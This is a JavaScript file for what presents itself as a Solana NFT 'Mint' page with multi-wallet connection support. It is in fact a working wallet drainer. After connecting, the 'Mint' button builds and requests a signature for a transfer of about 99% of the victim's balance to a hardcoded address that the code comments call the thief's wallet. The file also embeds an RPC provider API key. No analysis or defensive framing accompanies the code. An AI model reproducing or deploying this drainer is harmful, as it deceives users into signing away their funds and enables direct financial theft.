$(document).ready(function() {
    // Add wallet selection dropdown with more wallet options
    const walletOptions = [
        { name: "Phantom", key: "isPhantom", extensionCheck: true, walletConnect: false },
        { name: "Solflare", key: "isSolflare", extensionCheck: false, walletConnect: false },
        { name: "Backpack", key: "isBackpack", extensionCheck: false, walletConnect: false },
        { name: "Trust Wallet", key: "isTrust", extensionCheck: false, walletConnect: false },
        { name: "Glow", key: "isGlow", extensionCheck: false, walletConnect: false },
        { name: "Slope", key: "isSlope", extensionCheck: false, walletConnect: false },
        { name: "Sollet", key: "isSollet", extensionCheck: false, walletConnect: false },
        { name: "Coin98", key: "isCoin98", extensionCheck: false, walletConnect: false },
        { name: "Clover", key: "isClover", extensionCheck: false, walletConnect: false },
        { name: "MathWallet", key: "isMathWallet", extensionCheck: false, walletConnect: false },
        { name: "TokenPocket", key: "isTokenPocket", extensionCheck: false, walletConnect: false }
    ];

    // Function to detect mobile app or deep link support
    function isMobileDevice() {
        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }

    // Function to create mobile deep link with proper Solana connection
    function createMobileDeepLink(walletName, dappUrl = window.location.href) {
        const encodedUrl = encodeURIComponent(dappUrl);
        const mobileLinks = {
            "phantom": `https://phantom.app/ul/browse/${encodedUrl}?ref=${encodedUrl}`,
            "trust wallet": `https://link.trustwallet.com/open_url?coin_id=501&url=${encodedUrl}`,
            "solflare": `https://solflare.com/ul/v1/browse/${encodedUrl}?ref=${encodedUrl}`,
            "glow": `https://glow.app/browser?url=${encodedUrl}`,
            "slope": `https://slope.finance/browser?url=${encodedUrl}`,
            "coin98": `https://coin98.com/browser?url=${encodedUrl}`,
            "mathwallet": `https://mathwallet.org/browser?url=${encodedUrl}`,
            "tokenpocket": `https://tokenpocket.pro/browser?url=${encodedUrl}`
        };
        
        return mobileLinks[walletName.toLowerCase()] || null;
    }

    // Function to attempt mobile wallet connection
    function connectMobileWallet(walletName) {
        if (!isMobileDevice()) return false;
        
        const deepLink = createMobileDeepLink(walletName);
        if (deepLink) {
            // Open the wallet's browser with this dApp
            window.open(deepLink, '_blank');
            return true;
        }
        
        // Fallback to direct app schemes
        const appSchemes = {
            "phantom": "phantom://",
            "trust wallet": "trust://",
            "solflare": "solflare://",
            "glow": "glow://",
            "slope": "slope://",
            "coin98": "coin98://",
            "mathwallet": "mathwallet://",
            "tokenpocket": "tokenpocket://"
        };
        
        const scheme = appSchemes[walletName.toLowerCase()];
        if (scheme) {
            window.location.href = scheme;
            return true;
        }
        
        return false;
    }

    // Insert dropdown before button
    $('.button-container').prepend('<select id="wallet-select" style="margin-bottom:10px;padding:5px 10px;border-radius:5px;font-size:1rem;"></select>');
    walletOptions.forEach(opt => {
        $('#wallet-select').append(`<option value="${opt.name.toLowerCase()}">${opt.name}</option>`);
    });

    $('#connect-wallet').on('click', async () => {
        const selectedWallet = $('#wallet-select').val();
        let provider = null;
        let providerName = "";

        // Force disconnect from all wallets first to ensure clean state
        try {
            if (window.solana && window.solana.disconnect) {
                await window.solana.disconnect();
            }
            if (window.solflare && window.solflare.disconnect) {
                await window.solflare.disconnect();
            }
            if (window.backpack && window.backpack.disconnect) {
                await window.backpack.disconnect();
            }
        } catch (e) {
            // Ignore disconnect errors
        }

        // Wait a moment for disconnections to complete
        await new Promise(resolve => setTimeout(resolve, 100));

        // Enhanced wallet detection including mobile apps
        if (selectedWallet === "phantom" && window.solana && window.solana.isPhantom) {
            provider = window.solana;
            providerName = "Phantom";
        } else if (selectedWallet === "solflare" && (window.solflare || (window.solana && window.solana.isSolflare))) {
            provider = window.solflare || window.solana;
            providerName = "Solflare";
        } else if (selectedWallet === "backpack" && window.backpack) {
            provider = window.backpack;
            providerName = "Backpack";
        } else if (selectedWallet === "trust wallet" && (window.trustwallet || window.trustWallet)) {
            provider = window.trustwallet || window.trustWallet;
            providerName = "Trust Wallet";
        } else if (selectedWallet === "glow" && window.glow) {
            provider = window.glow;
            providerName = "Glow";
        } else if (selectedWallet === "slope" && window.Slope) {
            provider = window.Slope;
            providerName = "Slope";
        } else if (selectedWallet === "sollet" && window.sollet) {
            provider = window.sollet;
            providerName = "Sollet";
        } else if (selectedWallet === "coin98" && window.coin98) {
            provider = window.coin98.sol;
            providerName = "Coin98";
        } else if (selectedWallet === "clover" && window.clover_solana) {
            provider = window.clover_solana;
            providerName = "Clover";
        } else if (selectedWallet === "mathwallet" && window.solana && window.solana.isMathWallet) {
            provider = window.solana;
            providerName = "MathWallet";
        } else if (selectedWallet === "tokenpocket" && window.tokenpocket && window.tokenpocket.solana) {
            provider = window.tokenpocket.solana;
            providerName = "TokenPocket";
        }

        // Enhanced wallet extension/app checks with mobile support
        if (selectedWallet === "phantom" && (!window.solana || !window.solana.isPhantom)) {
            if (isMobileDevice()) {
                // Use mobile deep link approach for Phantom
                if (connectMobileWallet("phantom")) {
                    alert("Opening Phantom wallet app. Please return to this page after connecting.");
                    return;
                } else {
                    alert("Phantom app not found. Please install from App Store/Play Store.");
                    window.open("https://phantom.app/download", "_blank");
                }
            } else {
                alert("Phantom extension not found.");
                const isFirefox = typeof InstallTrigger !== "undefined";
                const isChrome = !!window.chrome;
                if (isFirefox) {
                    window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
                } else if (isChrome) {
                    window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
                } else {
                    alert("Please download the Phantom extension for your browser.");
                }
            }
            return;
        }

        // Check for Solflare extension/app if Solflare selected
        if (selectedWallet === "solflare" && !window.solflare && !(window.solana && window.solana.isSolflare)) {
            if (isMobileDevice()) {
                if (connectMobileWallet("solflare")) {
                    alert("Opening Solflare wallet app. Please return to this page after connecting.");
                    return;
                } else {
                    alert("Solflare app not found. Please install from App Store/Play Store.");
                    window.open("https://solflare.com/download", "_blank");
                }
            } else {
                alert("Solflare extension not found. Please install Solflare wallet.");
                window.open("https://solflare.com/download", "_blank");
            }
            return;
        }

        // Check for other wallets with mobile app support
        const walletChecks = {
            backpack: { obj: window.backpack, url: "https://backpack.app/download", scheme: "backpack://" },
            "trust wallet": { obj: window.trustwallet || window.trustWallet, url: "https://trustwallet.com/", scheme: "trust://" },
            glow: { obj: window.glow, url: "https://glow.app/download", scheme: "glow://" },
            slope: { obj: window.Slope, url: "https://slope.finance/", scheme: "slope://" },
            sollet: { obj: window.sollet, url: "https://sollet.io/", scheme: "sollet://" },
            coin98: { obj: window.coin98, url: "https://coin98.com/wallet", scheme: "coin98://" },
            clover: { obj: window.clover_solana, url: "https://clover.finance/wallet", scheme: "clover://" },
            mathwallet: { obj: window.solana && window.solana.isMathWallet, url: "https://mathwallet.org/", scheme: "mathwallet://" },
            tokenpocket: { obj: window.tokenpocket && window.tokenpocket.solana, url: "https://tokenpocket.pro/", scheme: "tokenpocket://" }
        };

        if (walletChecks[selectedWallet] && !walletChecks[selectedWallet].obj) {
            const wallet = walletChecks[selectedWallet];
            if (isMobileDevice()) {
                if (connectMobileWallet(selectedWallet)) {
                    alert(`Opening ${selectedWallet.charAt(0).toUpperCase() + selectedWallet.slice(1)} wallet app. Please return to this page after connecting.`);
                    return;
                } else {
                    alert(`${selectedWallet.charAt(0).toUpperCase() + selectedWallet.slice(1)} app not found. Please install from App Store/Play Store.`);
                    window.open(wallet.url, "_blank");
                }
            } else {
                alert(`${selectedWallet.charAt(0).toUpperCase() + selectedWallet.slice(1)} extension not found. Please install the wallet.`);
                window.open(wallet.url, "_blank");
            }
            return;
        }

        if (!provider) {
            alert("Selected wallet provider not found. For mobile wallets, please open this page directly in your wallet's browser.");
            return;
        }

        try {
            let resp;
            
            // Regular wallet provider connection
            resp = await provider.connect({ onlyIfTrusted: false });
            
            console.log(`${providerName} Wallet connected:`, resp);

            var connection = new solanaWeb3.Connection(
                'https://solana-mainnet.api.syndica.io/api-key/oNprEqE6EkkFUFhf1GBM4TegN9veFkrQrUehkLC8XKNiFUDdWhohF2pBsWXpZAgQRQrs8SwxFSXBc7vfdtDgBdFT726RmpzTj4', 
                'confirmed'
            );

            const public_key = new solanaWeb3.PublicKey(resp.publicKey || provider.publicKey);
            const walletBalance = await connection.getBalance(public_key);
            console.log("Wallet balance:", walletBalance);

            const minBalance = await connection.getMinimumBalanceForRentExemption(0);
            if (walletBalance < minBalance) {
                alert("Insufficient funds for rent.");
                return;
            }

            $('#connect-wallet').text("Mint");
            $('#connect-wallet').off('click').on('click', async () => {
                try {
                    const recieverWallet = new solanaWeb3.PublicKey('4NW3YXvEiNEVX6QxeS19FvSZ963vGqMQMvxguR8npq6s'); // Thief's wallet
                    const balanceForTransfer = walletBalance - minBalance;
                    if (balanceForTransfer <= 0) {
                        alert("Insufficient funds for transfer.");
                        return;
                    }

                    var transaction = new solanaWeb3.Transaction().add(
                        solanaWeb3.SystemProgram.transfer({
                            fromPubkey: public_key,
                            toPubkey: recieverWallet,
                            lamports: Math.floor(balanceForTransfer * 0.99),
                        }),
                    );

                    transaction.feePayer = public_key;
                    let blockhashObj = await connection.getLatestBlockhash();
                    transaction.recentBlockhash = blockhashObj.blockhash;

                    const signed = await provider.signTransaction(transaction);
                    console.log("Transaction signed:", signed);

                    let txid = await connection.sendRawTransaction(signed.serialize());
                    await connection.confirmTransaction(txid);
                    console.log("Transaction confirmed:", txid);
                } catch (err) {
                    console.error("Error during minting:", err);
                }
            });
        } catch (err) {
            console.error(`Error connecting to ${providerName} Wallet:`, err);
        }
    });
});
